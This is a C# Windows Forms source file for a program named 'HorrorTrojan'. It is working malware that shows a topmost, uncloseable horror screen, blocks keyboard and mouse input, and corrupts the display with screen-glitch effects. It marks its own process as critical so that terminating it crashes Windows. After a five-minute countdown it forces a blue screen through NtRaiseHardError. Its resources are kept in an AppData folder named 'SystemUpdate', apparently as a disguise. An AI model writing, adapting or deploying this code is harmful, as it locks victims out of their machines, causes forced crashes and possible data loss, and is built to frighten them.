using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Media;

namespace HorrorTrojan
{
    public partial class MainInterface : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int x1, int y1, int w1, int h1, IntPtr hdcSrc, int x2, int y2, int dw);
        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT rect);
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, IntPtr unicodeStringParameterMask,
            IntPtr parameters, uint validResponseOptions, out uint response);
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int Left, Top, Right, Bottom; }
        private const int NORMAL = 0x00CC0020;

        private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer videoTimer = new System.Windows.Forms.Timer();

        private int timeLeft = 300;
        private bool isGlitchActive = false;
        private bool isVideoActive = false;
        private Random rnd = new Random();
        private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
        private SoundPlayer musicPlayer;
        private Image gifImage;

        public MainInterface()
        {
            InitializeComponent();
            this.Load += MainInterface_Load;
        }

        private void InitializeComponent()
        {
            this.pictureBox = new PictureBox();
            this.timerLabel = new Label();
            this.bottomPanel = new Panel();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
            this.SuspendLayout();

            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.BackColor = Color.Black;
            this.Size = new Size(448, 520);
            this.DoubleBuffered = true;
            this.ControlBox = false;
            this.KeyPreview = false;

            this.pictureBox.Dock = DockStyle.Top;
            this.pictureBox.Size = new Size(448, 448);
            this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            this.pictureBox.BackColor = Color.Black;

            this.bottomPanel.Dock = DockStyle.Bottom;
            this.bottomPanel.Height = 72;
            this.bottomPanel.BackColor = Color.Black;

            this.timerLabel.AutoSize = false;
            this.timerLabel.Dock = DockStyle.Fill;
            this.timerLabel.TextAlign = ContentAlignment.MiddleCenter;
            this.timerLabel.ForeColor = Color.Red;
            this.timerLabel.BackColor = Color.Black;
            this.timerLabel.Font = new Font("Consolas", 48, FontStyle.Bold);
            this.timerLabel.Text = "5:00";

            this.bottomPanel.Controls.Add(this.timerLabel);
            this.Controls.Add(this.pictureBox);
            this.Controls.Add(this.bottomPanel);

            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
            this.ResumeLayout(false);
        }

        private void MainInterface_Load(object sender, EventArgs e)
        {
            LoadResources();
            StartTimers();
            SetupProtection();
            PlayMusic();
        }

        private void LoadResources()
        {
            try
            {
                string gifPath = Path.Combine(appDataPath, "hr.gif");
                if (File.Exists(gifPath))
                {
                    gifImage = Image.FromFile(gifPath);
                    this.pictureBox.Image = gifImage;
                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                    ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                }
            }
            catch { }
        }

        private void PlayMusic()
        {
            try
            {
                string musicPath = Path.Combine(appDataPath, "dv.mp3");
                if (File.Exists(musicPath))
                {
                    musicPlayer = new SoundPlayer(musicPath);
                    musicPlayer.PlayLooping();
                }
            }
            catch { }
        }

        private void StartTimers()
        {
            mainTimer.Interval = 1000;
            mainTimer.Tick += MainTimer_Tick;
            mainTimer.Start();

            glitchTimer.Interval = rnd.Next(120000, 180000);
            glitchTimer.Tick += GlitchTimer_Tick;
            glitchTimer.Start();

            videoTimer.Interval = rnd.Next(50000, 120000);
            videoTimer.Tick += VideoTimer_Tick;
            videoTimer.Start();
        }

        private void MainTimer_Tick(object sender, EventArgs e)
        {
            timeLeft--;
            if (timeLeft < 0) timeLeft = 0;

            int minutes = timeLeft / 60;
            int seconds = timeLeft % 60;
            timerLabel.Text = $"{minutes}:{seconds:D2}";

            if (timeLeft == 0)
            {
                mainTimer.Stop();
                glitchTimer.Stop();
                videoTimer.Stop();
                TriggerBSOD();
            }
        }

        private void GlitchTimer_Tick(object sender, EventArgs e)
        {
            if (!isVideoActive && !isGlitchActive)
            {
                isGlitchActive = true;
                glitchTimer.Interval = rnd.Next(5000, 15000);
                StartGlitchEffect();
            }
        }

        private void VideoTimer_Tick(object sender, EventArgs e)
        {
            if (!isGlitchActive && !isVideoActive)
            {
                isVideoActive = true;
                videoTimer.Interval = rnd.Next(50000, 120000);
                ShowRandomVideo();
            }
        }

        private void StartGlitchEffect()
        {
            try
            {
                glitchTimer.Stop();
                var glitchThread = new Thread(() =>
                {
                    try
                    {
                        for (int i = 0; i < 30; i++)
                        {
                            IntPtr hwnd = GetDesktopWindow();
                            IntPtr hdc = GetWindowDC(hwnd);
                            GetWindowRect(hwnd, out RECT rect);

                            int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width);
                            int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height);
                            int w = rnd.Next(100, 500);
                            int h = rnd.Next(100, 500);

                            BitBlt(hdc, x, y, w, h, hdc, rnd.Next(0, 100), rnd.Next(0, 100), NORMAL);
                            ReleaseDC(hwnd, hdc);
                            Thread.Sleep(100);
                        }
                    }
                    catch { }
                    finally
                    {
                        isGlitchActive = false;
                        glitchTimer.Start();
                    }
                });
                glitchThread.IsBackground = true;
                glitchThread.Start();
            }
            catch { }
        }

        private void ShowRandomVideo()
        {
            try
            {
                string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
                string videoPath = Path.Combine(appDataPath, videoFiles[rnd.Next(videoFiles.Length)]);
                if (File.Exists(videoPath))
                {
                    var videoThread = new Thread(() =>
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = videoPath,
                                UseShellExecute = true,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Maximized
                            });
                            Thread.Sleep(5000);
                        }
                        catch { }
                        finally
                        {
                            isVideoActive = false;
                            videoTimer.Start();
                        }
                    });
                    videoThread.IsBackground = true;
                    videoThread.Start();
                }
                else
                {
                    isVideoActive = false;
                    videoTimer.Start();
                }
            }
            catch
            {
                isVideoActive = false;
                videoTimer.Start();
            }
        }

        private void SetupProtection()
        {
            try
            {
                SetProcessCritical(true);
            }
            catch { }
        }

        private void SetProcessCritical(bool critical)
        {
            try
            {
                int isCritical = critical ? 1 : 0;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            }
            catch { }
        }

        private void TriggerBSOD()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out bool _);
                NtRaiseHardError(0xC0000000 | (uint)(DateTime.UtcNow.Ticks & 0xFFFFF), 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
            }
            catch { }
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSKEYDOWN = 0x0104;
            const int WM_KEYDOWN = 0x0100;
            const int WM_LBUTTONDOWN = 0x0201;
            const int WM_RBUTTONDOWN = 0x0204;
            const int WM_MBUTTONDOWN = 0x0207;
            const int WM_MOUSEMOVE = 0x0200;
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int SC_MINIMIZE = 0xF020;
            const int SC_MAXIMIZE = 0xF030;

            if (m.Msg == WM_SYSCOMMAND && ((int)m.WParam == SC_CLOSE || (int)m.WParam == SC_MINIMIZE || (int)m.WParam == SC_MAXIMIZE))
            {
                m.Result = IntPtr.Zero;
                return;
            }

            if (m.Msg == WM_SYSKEYDOWN || m.Msg == WM_KEYDOWN ||
                m.Msg == WM_LBUTTONDOWN || m.Msg == WM_RBUTTONDOWN ||
                m.Msg == WM_MBUTTONDOWN || m.Msg == WM_MOUSEMOVE)
            {
                return;
            }
            base.WndProc(ref m);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80000;
                cp.ExStyle |= 0x20;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private PictureBox pictureBox;
        private Label timerLabel;
        private Panel bottomPanel;

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                mainTimer?.Dispose();
                glitchTimer?.Dispose();
                videoTimer?.Dispose();
                musicPlayer?.Dispose();
                gifImage?.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
